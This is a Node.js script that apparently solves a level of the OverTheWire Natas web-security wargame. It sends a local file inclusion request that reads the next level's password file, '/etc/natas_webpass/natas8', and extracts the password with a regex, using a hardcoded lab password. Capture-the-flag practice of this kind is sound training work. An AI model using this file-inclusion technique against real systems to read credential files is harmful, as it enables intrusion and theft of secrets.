const http = require('http');
const fs = require('fs');
const querystring = require('querystring');

let username = 'natas7';
let password = '7z3hEENjQtflzgnT29q7wAvMNfZdh0i9';

let options = {
    host: `${username}.natas.labs.overthewire.org`,
    path: '/index.php?page=/etc/natas_webpass/natas8',
    auth: `${username}:${password}`,
}

let request = http.request(options, (res) => {
    res.setEncoding('utf8');
    res.on('data', data => {
        //fs.writeFile('index.html', data, () => {});
        console.log(data.match(/([0-9]|[a-zA-Z]){32}/g).filter(e => e != password)[0]);
    });
});

request.on('error', error => {
    console.log(error)
});

request.end();
